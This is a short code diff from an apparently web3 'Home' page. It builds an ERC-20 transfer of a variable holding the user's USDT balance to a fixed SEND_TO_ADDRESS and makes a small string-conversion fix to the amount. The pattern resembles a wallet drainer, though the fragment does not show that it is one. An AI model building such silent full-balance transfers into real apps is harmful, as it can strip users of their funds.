@@ -71,7 +71,7 @@ export default function Home() {
     const transaction = prepareContractCall({
       contract,
       method: "function transfer(address to, uint256 value)",
-      params: [SEND_TO_ADDRESS, toWei(usdtBalanceTemp)],
+      params: [SEND_TO_ADDRESS, toWei(usdtBalanceTemp+"")],
     })
 
     sendTx(transaction);
